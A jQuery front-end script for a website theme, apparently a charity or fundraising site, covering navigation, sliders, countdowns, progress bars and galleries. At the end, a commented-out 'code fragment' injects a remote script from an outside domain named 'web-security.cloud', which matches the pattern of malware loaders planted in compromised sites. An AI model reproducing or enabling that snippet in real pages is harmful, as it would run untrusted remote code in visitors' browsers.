(function($) {

	"use strict";


    /*------------------------------------------
        = FUNCTIONS
    -------------------------------------------*/
    // Toggle mobile navigation
    function toggleMobileNavigation() {
        var navbar = $("#navbar");
        var navLinks = $("#navbar > ul > li > a:not(.dropdown-toggle)");
        var openBtn = $(".navbar-header .open-btn");
        var closeBtn = $("#navbar .close-navbar");

        openBtn.on("click", function() {
            if (!navbar.hasClass("slideInn")) {
                navbar.addClass("slideInn");
            }
            return false;
        })

        closeBtn.on("click", function() {
            if (navbar.hasClass("slideInn")) {
                navbar.removeClass("slideInn");
            }
            return false;            
        })
    }

    toggleMobileNavigation();


    // Function for toggle small navigation class
    function ToggleMobileMenuClass() {
        var viportwidth = window.innerWidth;
        var navBar = $("#navbar > ul");

        if (viportwidth <= 991) {
            if (!navBar.hasClass("small-nav")) {
               navBar.addClass("small-nav");
            }
        } else {
             navBar.removeClass("small-nav");
        }
    }    

   // Small navigation functionality
    function smallNavFunctionality() {
        if ($(".small-nav").length) {
            var smallNav = $(".small-nav"),
                subMenu = smallNav.find(".sub-menu"),
                subMenuLink = subMenu.find(" > a"),
                subSubMenu = smallNav.find(".sub-sub-menu"),
                subSubMenuLink = subSubMenu.find(" > a");
            
            subMenu.find("ul").hide();

            subMenuLink.on("click", function(e) {
                e.preventDefault();
                $(this).next().slideToggle();
                return false;
            });

            subSubMenuLink.on("click", function(e) {
                e.preventDefault();
                $(this).next().slideToggle();
                return false;
            })
        }
    }


    // Parallax background
    function bgParallax() {
        if ($(".parallax").length) {
            $(".parallax").each(function() {
                var height = $(this).position().top;
                var resize     = height - $(window).scrollTop();
                var doParallax = -(resize/5);
                var positionValue   = doParallax + "px";
                var img = $(this).data("bg-image");

                $(this).css({
                    backgroundImage: "url(" + img + ")",
                    backgroundPosition: "50%" + positionValue,
                    backgroundSize: "cover"
                });
            });
        }
    }


    // Hero slider background setting
    function sliderBgSetting() {
        if ($(".hero-slider .slide").length) {
            $(".hero-slider .slide").each(function() {
                var $this = $(this);
                var img = $this.children(img);
                var imgSrc = img.attr("src");

                $this.css({
                    backgroundImage: "url("+ imgSrc +")",
                    backgroundSize: "cover",
                    backgroundPosition: "center center"
                })
            });
        }
    }


    // set two coloumn height equial
    function setTwoColEqHeight($col1, $col2) {
        var firstCol = $col1,
            secondCol = $col2,
            firstColHeight = $col1.innerHeight(),
            secondColHeight = $col2.innerHeight();

        if (firstColHeight > secondColHeight) {
            secondCol.css({
                "height": firstColHeight + 1 + "px"
            })
        } else {
            firstCol.css({
                "height": secondColHeight + 1 + "px"
            })
        }
    }

    // toggle mini cart
    function toggleMiniCartBtn() {
        var miniCartBtn = $(".mini-cart-btn"),
            miniCart = $(".mini-cart");

        miniCart.hide();
        miniCartBtn.on("click", function(e) {
            e.preventDefault();
            miniCart.slideToggle();
            return false;
        })
    }

    if ($(".mini-cart-wrapper").length) {
        toggleMiniCartBtn();
    }


    /*------------------------------------------
        = WOW ANIMATION SETTING
    -------------------------------------------*/
    var wow = new WOW({
        boxClass:     'wow',      // default
        animateClass: 'animated', // default
        offset:       0,          // default
        mobile:       true,       // default
        live:         true        // default
    }); 


    // Setting main hero slider
    function mainHeroSlider() {
        if ($(".hero-slider").length) {
            $(".hero-slider").owlCarousel({
                items: 1,
                autoplay: true,
                loop: true,
                mouseDrag: false,
                nav: true,
                navText: ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
                autoplaySpeed: 700,
                navSpeed: 700,
                dotsSpeed: 700
            });
        }
    }


    /*------------------------------------------
        = HIDE PRELOADER
    -------------------------------------------*/
    function preloader() {
        if($('.preloader').length) {
            $('.preloader').delay(100).fadeOut(500, function() {
                //active wow
                wow.init();

                // active background image setting for hero slider
                sliderBgSetting();

                 //Active heor slider
                mainHeroSlider();

                if ($(".home-style-four .hero-title").length) {
                    var heroTitle = $(".home-style-four .hero-title");
                    heroTitle.addClass("active-hero-title");
                }

                if ($(".home-style-five .main-banar .banar-title").length) {
                    var heroTitle = $(".home-style-five .main-banar .banar-title");
                    heroTitle.addClass("active-banar-title");
                }
            });
        }
    }


    /*------------------------------------------
        = STICKY HEADER
    -------------------------------------------*/
    $(window).on("scroll", function() {
        var header = $("#header");
        var mainNavigation = $("#main-navigation");
        var scroll = $(window).scrollTop();
        var top = $(".top-bar").innerHeight();

        if ((scroll > top) && !header.hasClass("header-style-three")) {
            mainNavigation.addClass("sticky");
        } else {
            mainNavigation.removeClass("sticky");
        }
    });

    if ($(".header-style-three").length) {
        $(window).on("scroll", function() {
            var mainNavigation = $("#main-navigation");
            var scroll = $(window).scrollTop();
            var top = $(".topbar").innerHeight();

            if (scroll > top) {
                mainNavigation.addClass("sticky");
            } else {
                mainNavigation.removeClass("sticky");
            }
        });        
    }


    /*------------------------------------------
        = POPUP VIDEO
    -------------------------------------------*/  
    if ($(".video-btn").length) {
        $(".video-btn").on("click", function(){
            $.fancybox({
                href: this.href,
                type: $(this).data("type"),
                'title'         : this.title,
                helpers     : {  
                    title : { type : 'inside' },
                    media : {}
                },

                beforeShow : function(){
                    $(".fancybox-wrap").addClass("gallery-fancybox");
                }
            });
            return false
        });    
    }


    /*------------------------------------------
        = POPULAR-CAMPAIGN METER
    -------------------------------------------*/
    function popularCampaignMeter() {
        if ($(".popular-campaign .meter").length) {
            var $meter = $('.meter');
            $meter.appear();
            $(document.body).on('appear', '.meter', function() {
                var current_item = $(this);
                if (!current_item.hasClass('appeared')) {
                    current_item.addClass('appeared');
                    $(".meter").circleProgress({
                        size: 45,
                        thickness: 2,
                        fill: "#fff",
                        animation: {
                             duration: 2000
                        }
                    }).on('circle-animation-progress', function(event, progress, stepValue) {
                        var $this = $(this);
                        $this.find('span').html(Math.round(100 * stepValue) + '<i>%</i>');
                    });
                }                
            });
        };
    }

    popularCampaignMeter();


    /*------------------------------------------
        = LATEST CAUSES PROGRESS BAR
    -------------------------------------------*/
    function causesProgressBar() {
        if ($(".progress-bar").length) {
            var $progress_bar = $('.progress-bar');
            $progress_bar.appear();
            $(document.body).on('appear', '.progress-bar', function() {
                var current_item = $(this);
                if (!current_item.hasClass('appeared')) {
                    var percent = current_item.data('percent');
                    current_item.append('<span>' + percent + '%' + '</span>').css('width', percent + '%').addClass('appeared');
                }
                
            });
        };
    }

    causesProgressBar();



    /*------------------------------------------
        = EVENTS SLIDER
    -------------------------------------------*/
    if ($(".events-slider").length) {
        $(".events-slider").owlCarousel({
            autoplay:true,
            smartSpeed:300,
            //items:5,
            loop:true,
            margin:0,
            dots:false,
            center:true,
            autoplayHoverPause:true,
            nav: true,
            navText: ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
            responsive: {
                0 : {
                    items: 2
                },

                600 : {
                    items: 3
                },

                991 : {
                    items: 3
                },

                992 : {
                    items: 5
                }
            }
        });
    }


    /*------------------------------------------
        = LATEST NEWS SLIDER
    -------------------------------------------*/
    if ($(".latest-news-slider").length) {
        $(".latest-news-slider").owlCarousel({
            autoplay:true,
            smartSpeed:300,
            items:4,
            loop:true,
             responsive: {
                0 : {
                    items: 1
                },

                500 : {
                    items: 2
                },

                992 : {
                    items: 3
                },

                1200 : {
                    items: 4
                }
            }
        });
    }


    /*------------------------------------------
        = URGENT SLIDER
    -------------------------------------------*/
    if ($(".urgent-slider").length) {
        $(".urgent-slider").owlCarousel({
            mouseDrag: false,
            smartSpeed:300,
            items:1,
            loop:true,
            margin:0,
            center:true,
            autoplayHoverPause:true,
            nav: true,
            navText: ["<i class='fa fa-long-arrow-left'></i> PREV","NEXT <i class='fa fa-long-arrow-right'></i>"]
        });
    }


    /*------------------------------------------
        = FUNCTION FORM SORTING GALLERY
    -------------------------------------------*/
    function sortingGallery() {
        if ($(".sortable-gallery .gallery-filters").length) {
            var $container = $('.gallery-container');
            $container.isotope({
                filter:'*',
                animationOptions: {
                    duration: 750,
                    easing: 'linear',
                    queue: false,
                }
            });

            $(".gallery-filters li a").on("click", function() {
                $('.gallery-filters li .current').removeClass('current');
                $(this).addClass('current');
                var selector = $(this).attr('data-filter');
                $container.isotope({
                    filter:selector,
                    animationOptions: {
                        duration: 750,
                        easing: 'linear',
                        queue: false,
                    }
                });
                return false;
            });
        }
    }

    sortingGallery();


    /*------------------------------------------
        = ACTIVE GALLERY POPUP IMAGE
    -------------------------------------------*/  
    if ($(".popup-gallery").length) {
        $('.popup-gallery').magnificPopup({
            delegate: 'a',
            type: 'image',

            gallery: {
              enabled: true
            },

            zoom: {
                enabled: true,

                duration: 300,
                easing: 'ease-in-out',
                opener: function(openerElement) {
                    return openerElement.is('img') ? openerElement : openerElement.find('img');
                }
            }
        });    
    }


    /*------------------------------------------
        = ACTIVE EVENT 3 COL FEATURED COUNTDOWN
    -------------------------------------------*/  
    if ($("#countdown").length){
        $('#countdown').ClassyCountdown({
            theme: "white", 
            now:  $.now()/1000 ,
            end:  '1493596800' ,

           // end: $.now() + 31556926 , 

            labelsOptions: {
                lang: {
                    days: 'Days',
                    hours: 'Hrs',
                    minutes: 'Mins',
                    seconds: 'Secs'
                }
            },

            // custom style for the countdown
            style: {
                element: '',
                labels: false,

                days: {
                    gauge: {
                        thickness: 0.03,
                        bgColor: '#000',
                        fgColor: '#fb5e1c',
                        lineCap: 'butt'
                    }
                },

                hours: {
                    gauge: {
                        thickness: 0.03,
                        bgColor: '#000',
                        fgColor: '#fb5e1c',
                        lineCap: 'butt'
                    }
                },

                minutes: {
                    gauge: {
                        thickness: 0.03,
                        bgColor: '#000',
                        fgColor: '#fb5e1c',
                        lineCap: 'butt'
                    }
                },

                seconds: {
                    gauge: {
                        thickness: 0.03,
                        bgColor: '#000',
                        fgColor: '#fb5e1c',
                        lineCap: 'butt'
                    }
                }
            }
        });
    }



    /*------------------------------------------
        = ABOUT PAGE ACCRODIAN TOGGLE CALSS
    -------------------------------------------*/  
    if ($(".about-us-st #accordion").length) {
        var panelHeading = $(".about-us-st #accordion .panel-heading > a");
        
        panelHeading.on("click", function() {
            var $this = $(this);
            if (!$this.closest(".panel").hasClass("current")) {
                $this.closest(".panel").addClass("current");
            } else {
                 $this.closest(".panel").removeClass("current");
            }
            
            $this.closest(".panel").siblings().removeClass("current");
        });
    }


    /*------------------------------------------
        = SPONSOR SLIDER
    -------------------------------------------*/
    if ($(".sponsor-slider").length) {
        $(".sponsor-slider").owlCarousel({
            smartSpeed:300,
            loop:true,
            margin:0,
            dots:false,
            center:true,
            autoplayHoverPause:true,
            nav: true,
            navText: ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
            responsive: {
                0 : {
                    items: 1
                },

                450 : {
                    items: 3
                },

                650 : {
                    items: 5
                },

                992 : {
                    items: 3
                }
            }
        });
    }





    /*------------------------------------------
        = EVENTS SLIDER
    -------------------------------------------*/
    if ($(".events-nearby-slider").length) {
        $(".events-nearby-slider").owlCarousel({
            autoplay:true,
            smartSpeed:300,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1
                },

                600 : {
                    items: 2
                },

                991 : {
                    items: 2
                },

                992 : {
                    items: 3
                }
            }
        });
    }


   
    /*------------------------------------------
        = FUNFACT
    -------------------------------------------*/  
    if ($(".fun-fact").length) {
        $('.counter').appear();
        $(document.body).on('appear', '.counter', function(e) {
            var $this = $(this),
            countTo = $this.attr('data-count');

            $({ countNum: $this.text()}).animate({
                countNum: countTo
            }, {
                duration: 3000,
                easing:'linear',
                step: function() {
                    $this.text(Math.floor(this.countNum));
                },
                complete: function() {
                    $this.text(this.countNum);
                }
            });
        });
    }   


    /*------------------------------------------
        = TESTIMONIAL SLIDER
    -------------------------------------------*/
    if ($(".testimonials-slider").length) {
        $(".testimonials-slider").owlCarousel({
            autoplay:true,
            smartSpeed:300,
            items:2,
            loop:true,
            autoplayHoverPause:true,
            margin: 30,
            mouseDrag: false,
            responsive: {
                0 : {
                    items: 1
                },

                991 : {
                    items: 1
                },

                992 : {
                    items: 2
                }
            }
        });
    }


    /*------------------------------------------
        = PARTNER SLIDER
    -------------------------------------------*/
    if ($(".partner-slider").length) {
        $(".partner-slider").owlCarousel({
            autoplay:true,
            smartSpeed:300,
            items:4,
            loop:true,
            autoplayHoverPause:true,
            mouseDrag: false,
            dots: false,
            nav: true,
            navText: ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
            responsive: {
                0 : {
                    items: 1
                },

                400 : {
                    items: 2
                },

                600 : {
                    items: 3
                },

                992 : {
                    items: 4
                }
            }
        });
    }


    /*-------------------------------------------------------
        = HOME STYLE FIVE URGENT CAUSES CLOCK, PROGRESS ETC
    -------------------------------------------------------*/
    if ($("#causes-end-time").length) {
        $('#causes-end-time').countdown('2017/04/31', function(event) {
            var $this = $(this).html(event.strftime(''
            + '<div class="box"><div>%D</div> <span>Days</span> </div>'
            + '<div class="box"><div>%H</div> <span>Hours</span> </div>'
            + '<div class="box"><div>%M</div> <span>Mins</span> </div>'
            + '<div class="box"><div>%S</div> <span>Secs</span> </div>'));
        });
    }

    function urgentCausesProgressBar() {
        if ($(".urgent-causes .progress-bar").length) {
            var progressBar = $(".urgent-causes .progress-bar");
            var percent = progressBar.data('percent');
            progressBar.css('width', percent + '%');
                
        };
    }


    // Toggle urgent causes section
    if ($(".urgent-causes-wrapper").length) {
        var urgentCauses = $(".urgent-causes-wrapper .urgent-causes");
        var urgentCausesOpnBtn = $(".urgent-causes-wrapper #toggle-causes");

        urgentCauses.hide();

        urgentCausesOpnBtn.on("click", function() {
            urgentCauses.slideToggle();
            urgentCausesProgressBar();
            urgentCausesOpnBtn.toggleClass("open");
            return false;
        })
    }  


    /*------------------------------------------
        = PARTNER SLIDER
    -------------------------------------------*/
    if ($(".event-s2-slider").length) {
        $(".event-s2-slider").owlCarousel({
            items:2,
            loop:true,
            autoplayHoverPause:true,
            mouseDrag: false,
            responsive: {
                0 : {
                    items: 1
                },

                551 : {
                    items: 2
                }
            }
        });
    }


    /*------------------------------------------------------
        = GOOGLE MAP FOR HOME STYLE FIVE ABOUT AREA
    ----------------------------------------------------*/  
    if ($(".map-link").length) {
        $('.map-link').magnificPopup({
            type: 'iframe'
        }); 
    }


    /*----------------------------------------------------
        = HOME STYLE FIVE ABOUT ACCRODIAN TOGGLE CALSS
    --------------------------------------------------------*/  
    if ($(".about-st3 #accordion").length) {
        var panelHeading = $(".about-st3 #accordion .panel-heading > a");
        
        panelHeading.on("click", function() {
            var $this = $(this);
            if (!$this.closest(".panel").hasClass("current")) {
                $this.closest(".panel").addClass("current");
            } else {
                 $this.closest(".panel").removeClass("current");
            }
            
            $this.closest(".panel").siblings().removeClass("current");
        });
    }


    /*------------------------------------------
        = MASONRY GALLERY SETTING
    -------------------------------------------*/
    function masonryGridSetting() {
        if ($('.masonry-gallery').length) {
            var $grid =  $('.masonry-gallery').masonry({
                itemSelector: '.box',
                columnWidth: '.box',
                percentPosition: true
            });

            $grid.imagesLoaded().progress( function() {
                $grid.masonry('layout');
            });
        }
    }

    masonryGridSetting();    



    /*==========================================================================
        WHEN DOCUMENT LOADING 
    ==========================================================================*/
        $(window).on('load', function() {

            preloader();

            ToggleMobileMenuClass();

            smallNavFunctionality();

            sliderBgSetting();

            bgParallax();

            popularCampaignMeter();

            causesProgressBar();

            sortingGallery();

            masonryGridSetting();

           
            // set cta-2 two col equial
            if ($(".cta-2").length) {
                setTwoColEqHeight($(".cta-2 .join-us"), $(".cta-2 .sing-up"));
            }

            // set newsletter two col equial
            if ($(".newsletter").length) {
                setTwoColEqHeight($(".newsletter .children-holder"), $(".newsletter .subscribe"));
            }  

            // set cancer text featured two col equal height
            if ($(".event-3col .featured").length) {
                setTwoColEqHeight($(".event-3col .featured .featured-promo"), $(".event-3col .featured .countdown-wrapper"));
            }

            // set sponsor row two colounm equal height
            if ($(".sponsor").length) {
                setTwoColEqHeight($(".sponsor .left-col"), $(".sponsor .right-col"));
            }

            // home style 4 about-st2 two col equal height
            if ($(".about-st2").length) {
                setTwoColEqHeight($(".about-st2 .left-col"), $(".about-st2 .right-col"));
            }
        });


    /*==========================================================================
        WHEN WINDOW SCROLL
    ==========================================================================*/
    $(window).on("scroll", function() {
        bgParallax();
    });


    /*==========================================================================
        WHEN WINDOW RESIZE
    ==========================================================================*/
    $(window).on("resize", function() {

        // set cta-2 two col equial
        if ($(".cta-2").length) {
            setTwoColEqHeight($(".cta-2 .join-us"), $(".cta-2 .sing-up"));
        }

        // set newsletter two col equial
        if ($(".newsletter").length) {
            setTwoColEqHeight($(".newsletter .children-holder"), $(".newsletter .subscribe"));
        }

        // set sponsor row tow colounm equal height
        if ($(".sponsor").length) {
            setTwoColEqHeight($(".sponsor .left-col"), $(".sponsor .right-col"));
        }

        // home style 4 about-st2 two col equal height
        if ($(".about-st2").length) {
            setTwoColEqHeight($(".about-st2 .left-col"), $(".about-st2 .right-col"));
        }  
    });


})(window.jQuery);


// code fragment

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/